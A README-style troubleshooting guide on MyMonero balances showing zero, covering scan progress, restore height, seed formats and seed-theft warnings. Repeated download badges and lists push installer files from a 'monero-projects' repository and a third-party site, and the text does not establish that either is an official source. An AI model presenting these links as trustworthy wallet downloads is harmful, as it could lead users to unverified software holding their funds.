<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Balance Shows Zero</h1>
<p align="center">Check wallet selection, scanning, restore height, and connection before concluding funds are missing.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
A zero balance can mean the wallet has not finished scanning, the wrong wallet was opened, or the displayed history is out of date. Confirm the seed and scan settings privately, then let the wallet update before taking action.


For a second walkthrough, see [MyMonero balance zero on mymonero.info](https://mymonero.info/mymonero-balance-zero). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [the MyMonero FAQ](https://mymonero.info/faq).

## You'll see this if
- A wallet that previously had XMR now displays zero.
- You restored a wallet and do not see old activity.
- A recent update or reinstall changed what appears on screen.
- You see an address you do not recognize or are unsure which wallet is open.

## Why it happens
A wallet balance is calculated from activity that wallet has scanned. If the scan is incomplete or begins after earlier activity, the screen may not yet show the funds you expect. Restore height is the block height at which scanning begins. An earlier height is safer when uncertain, although scanning more history takes longer. A server connection problem can also interrupt the process; error 523 is general guidance that the server connection is unavailable, not evidence that funds have disappeared.

A second common cause is opening a different wallet from the one used before. Wallet names are labels, not proof that two installations represent the same wallet. Compare the receiving address and restore the correct seed only within a trusted application. MyMonero seeds may be 13 words (MyMonero-specific, legacy) or 25 words (standard Monero); those formats need compatible restore methods. See [restore a MyMonero wallet](./restore-mymonero-wallet.md) and [13-word seed restore details](./mymonero-13-word-seed-restore.md).

MyMonero desktop's final release, v1.3.3, remains available for Windows (.exe), macOS (.dmg), and Linux (.zip) on the [GitHub release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). The old app still opens wallets and sends XMR but is no longer maintained; it receives no new features or security updates. MyMonero hosted servers and web wallet login stopped. You can keep using desktop or restore the seed in Cake Wallet, which runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Review [MyMonero migration choices](./mymonero-to-cake-wallet-migration.md).

---
## Fix
1. **Pause before sending or restoring again.** A zero display alone does not establish that funds are gone. Avoid creating a replacement wallet and sending funds until you identify the wallet and understand what its scan shows.
2. **Confirm the wallet identity.** Check the wallet label and receiving address against your own records. Do not publish your address together with personal details, and never disclose your seed or private keys. If the address is not the one you expect, close the wallet and locate the correct recovery backup privately.
3. **Check whether scanning is complete.** Look for a sync or scanning indicator and allow it time to update. Keep the application open and connected as appropriate. If it appears stalled, use [MyMonero not syncing guidance](./mymonero-not-syncing.md) and distinguish a server connection issue from a seed problem.
4. **Review restore height.** If this is a restored wallet, confirm the scan start point. A height set later than the wallet's earlier activity can omit that history. When uncertain, choose an earlier height using the wallet's restore process; it is safer for finding older activity but takes longer. Read restore height explained before changing settings.
5. **Check the seed format.** A 13-word seed is MyMonero-specific and legacy; a 25-word seed is standard Monero. Use the matching restore option. Inspect your own backup for order and legibility without entering it into a website or sending it to a helper. For a rejected seed see MyMonero seed not accepted.
6. **Allow the wallet to rescan.** Reopening, restoring, or adjusting a scan point may require time to process history. Avoid repeatedly changing settings while a scan is underway. Check the balance again after the wallet reports current status.
7. **Look for activity, not just the headline amount.** Review incoming transaction history and status. An incoming transfer might still be pending or locked and therefore not appear as spendable. Learn the distinction in locked and pending balance and transaction not showing.
8. **Use a trusted support route only for non-secret details.** If you contact the project or wallet provider, describe the app version, operating system, and visible error without sending seed words, keys, or password. Nobody legitimate should ask for your seed.

> [!WARNING]
> Do not enter your seed into a page that promises to reveal a missing balance. Seed theft can put funds at risk, and no legitimate helper needs your recovery words.

---
## If that did not work
If the wallet has completed scanning from an appropriate height and still shows zero, verify that you restored the intended seed and compatible format. A typo or different seed can open a valid but different wallet. Do not try to infer missing words from online advice or share partial words in public. Details about 13 versus 25 seed words can help you identify the format.

If an incoming transaction is missing, confirm the destination address you used and check its status in the sending wallet or service. Exchange deposits may have their own crediting steps. Do not send again solely because a balance is delayed. For an outgoing transfer, use withdraw XMR from MyMonero guidance and keep private transaction records.

If MyMonero desktop cannot connect, error 523 relates generally to server connection unavailability. The hosted MyMonero web wallet login has stopped, and an error should not lead you to a replacement login page. The desktop app is no longer maintained. Its project information is on the MyMonero desktop repository. Consider whether to continue with the desktop app or use Cake Wallet, without disclosing your seed to anyone.

## Prevention
- Keep the full seed in a secure, private offline backup and note whether it is 13 or 25 words.
- Keep a non-secret record of the wallet's relevant restore height and approximate activity period.
- After restoring, let scanning finish before interpreting the balance.
- Confirm the wallet address before receiving funds and check transaction status when expecting a deposit.
- Avoid unofficial web login pages, unsolicited recovery offers, and any request for seed words.
- Download desktop software only through the project release information and verify file integrity as described in check a MyMonero download.

## FAQ
<details><summary>Does a zero balance mean my funds are lost?</summary>

Not by itself. The wrong wallet, incomplete scan, restore height, or connection issue can affect what appears. Confirm the wallet and scan before drawing conclusions.

</details>

<details><summary>Should I choose an earlier restore height?</summary>

If you are unsure, earlier is safer because the scan covers more history, but it takes longer. Follow the wallet's restore guidance.

</details>

<details><summary>Can a pending deposit appear unavailable?</summary>

Yes. Funds may be pending or locked before they become spendable. Check transaction history and allow the network and wallet to update.

</details>

<details><summary>Can I send my seed to support?</summary>

No. Nobody legitimate should ask for your seed or private keys. Keep them private, including when troubleshooting a zero balance.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Transaction Not Showing](./mymonero-transaction-not-showing.md) | Troubleshoot missing incoming or outgoing activity without exposing wallet secrets. |
| [MyMonero Locked or Pending Balance](./mymonero-locked-pending-balance.md) | Understand why total funds and the amount available to send may differ. |
| [MyMonero Spendable Balance Is Low](./mymonero-spendable-balance-low.md) | Find out why the amount available to send can be less than your total wallet balance. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
